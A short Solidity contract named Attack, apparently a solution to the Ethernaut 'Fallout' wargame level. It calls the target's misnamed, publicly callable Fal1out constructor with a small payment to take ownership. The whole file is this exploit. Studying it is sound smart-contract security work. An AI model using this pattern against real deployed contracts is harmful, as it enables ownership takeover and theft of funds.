// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallout {
    function Fal1out() external payable;
    function collectAllocations() external;
}

contract Attack {
    IFallout public target;

    constructor(address _target) {
        target = IFallout(_target);
    }

    function attack() public payable {
        target.Fal1out{ value: 0.0001 ether}();
    }
}